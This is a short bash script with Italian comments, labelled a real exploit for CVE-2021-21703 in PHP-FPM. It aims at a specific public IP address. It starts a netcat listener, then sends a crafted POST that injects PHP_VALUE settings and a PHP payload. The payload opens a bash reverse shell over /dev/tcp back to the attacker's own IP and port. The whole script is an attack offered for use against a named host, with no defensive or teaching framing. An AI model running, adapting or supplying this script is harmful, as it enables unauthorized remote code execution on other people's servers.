#!/bin/bash
# CVE-2021-21703 REAL EXPLOIT (da GitHub PoC adattato)
TARGET="14.225.209.143:443"
IP=$(curl -s ifconfig.me)
PORT=4444

echo "[+] Target: https://${TARGET}"
echo "[+] Callback: ${IP}:${PORT}"

# LISTENER
nc -lvnp $PORT &
sleep 1

# REAL EXPLOIT (metodo FPM upstream)
curl -k -s \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "REQUEST_METHOD=POST" \
  --data-urlencode "SCRIPT_NAME=index.php" \
  --data-urlencode "PHP_VALUE=allow_url_include=1" \
  --data-urlencode "PHP_VALUE=auto_prepend_file=php://input" \
  --data-binary "<?php system(\"/bin/bash -c 'bash -i >& /dev/tcp/${IP}/${PORT} 0>&1'\"); ?>" \
  "https://${TARGET}/" -v
